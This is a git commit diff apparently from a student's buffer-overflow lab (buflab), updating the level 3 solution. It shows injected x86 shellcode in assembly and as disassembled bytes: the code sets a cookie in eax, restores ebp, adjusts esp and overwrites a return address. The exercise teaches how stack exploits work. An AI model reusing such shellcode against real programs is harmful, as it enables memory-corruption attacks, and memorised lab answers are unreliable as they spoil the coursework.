a1634c8401c70befa26e1eafda69a7360014b499
Won Wook SONG <wsong0512@gmail.com>
2015-03-23 02:16:06 +0900

    update level3 solution

--- buflab-handout/level3assembly.d
+++ buflab-handout/level3assembly.d
@@ -7,6 +7,7 @@ Disassembly of section .text:
 00000000 <.text>:
    0:	b8 69 46 8d 23       	mov    $0x238d4669,%eax
    5:	bd f0 5f 68 55       	mov    $0x55685ff0,%ebp
-   a:	c7 05 08 2f 68 55 15 	movl   $0x8048f15,0x55682f08
-  11:	8f 04 08 
-  14:	c3                   	ret    
+   a:	bc 04 2f 68 55       	mov    $0x55682f04,%esp
+   f:	c7 05 04 2f 68 55 15 	movl   $0x8048f15,0x55682f04
+  16:	8f 04 08 
+  19:	c3                   	ret    
--- buflab-handout/level3assembly.s
+++ buflab-handout/level3assembly.s
@@ -1,4 +1,5 @@
-movl $0x238d4669, %eax # move cookie value to eax
-movl $0x55685ff0, %ebp # restore ebp
-movl $0x8048f15, 0x55682f08 #copy return address to memory
+mov $0x238d4669, %eax # move cookie value to eax
+mov $0x55685ff0, %ebp # restore ebp
+mov $0x55682f04, %esp # move esp so that is returns to ifself upon ret
+movl $0x8048f15, 0x55682f04 #copy return address to memory
 ret
